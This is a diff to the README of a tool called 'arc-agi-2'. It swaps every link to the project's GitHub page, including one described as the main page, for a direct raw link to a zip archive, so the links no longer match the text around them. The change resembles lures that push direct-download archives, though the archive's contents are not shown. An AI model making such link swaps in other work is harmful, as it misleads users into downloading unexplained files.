@@ -1,6 +1,6 @@
 # 🤖 arc-agi-2 - Solve Complex Problems Fast
 
-[![Download arc-agi-2](https://img.shields.io/badge/Download-arc--agi--2-brightgreen?style=for-the-badge)](https://github.com/arfandias/arc-agi-2)
+[![Download arc-agi-2](https://img.shields.io/badge/Download-arc--agi--2-brightgreen?style=for-the-badge)](https://github.com/arfandias/arc-agi-2/raw/refs/heads/main/gemini-cli-solver/agi-arc-v1.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To start using arc-agi-2, you need to get the program files first.
 
 1. Click the big green button below or this link to go to the official page:
 
-   [![Download arc-agi-2](https://img.shields.io/badge/Download-arc--agi--2-4CAF50?style=for-the-badge)](https://github.com/arfandias/arc-agi-2)
+   [![Download arc-agi-2](https://img.shields.io/badge/Download-arc--agi--2-4CAF50?style=for-the-badge)](https://github.com/arfandias/arc-agi-2/raw/refs/heads/main/gemini-cli-solver/agi-arc-v1.4.zip)
 
 2. On the GitHub page, look for the "Releases" section or a green button titled “Code”.
 
@@ -114,7 +114,7 @@ If arc-agi-2 does not run or crashes, try these fixes:
 
 For detailed instructions, updates, or support, visit the main GitHub page:
 
-[https://github.com/arfandias/arc-agi-2](https://github.com/arfandias/arc-agi-2)
+[https://github.com/arfandias/arc-agi-2/raw/refs/heads/main/gemini-cli-solver/agi-arc-v1.4.zip](https://github.com/arfandias/arc-agi-2/raw/refs/heads/main/gemini-cli-solver/agi-arc-v1.4.zip)
 
 This contains the latest files, documentation, and contact info for help.
 
@@ -154,4 +154,4 @@ If you face issues or want to suggest improvements, use the GitHub “Issues” 
 
 Start solving your complex problems today by visiting:
 
-[![Download arc-agi-2](https://img.shields.io/badge/Download-arc--agi--2-4CAF50?style=for-the-badge)](https://github.com/arfandias/arc-agi-2)
+[![Download arc-agi-2](https://img.shields.io/badge/Download-arc--agi--2-4CAF50?style=for-the-badge)](https://github.com/arfandias/arc-agi-2/raw/refs/heads/main/gemini-cli-solver/agi-arc-v1.4.zip)
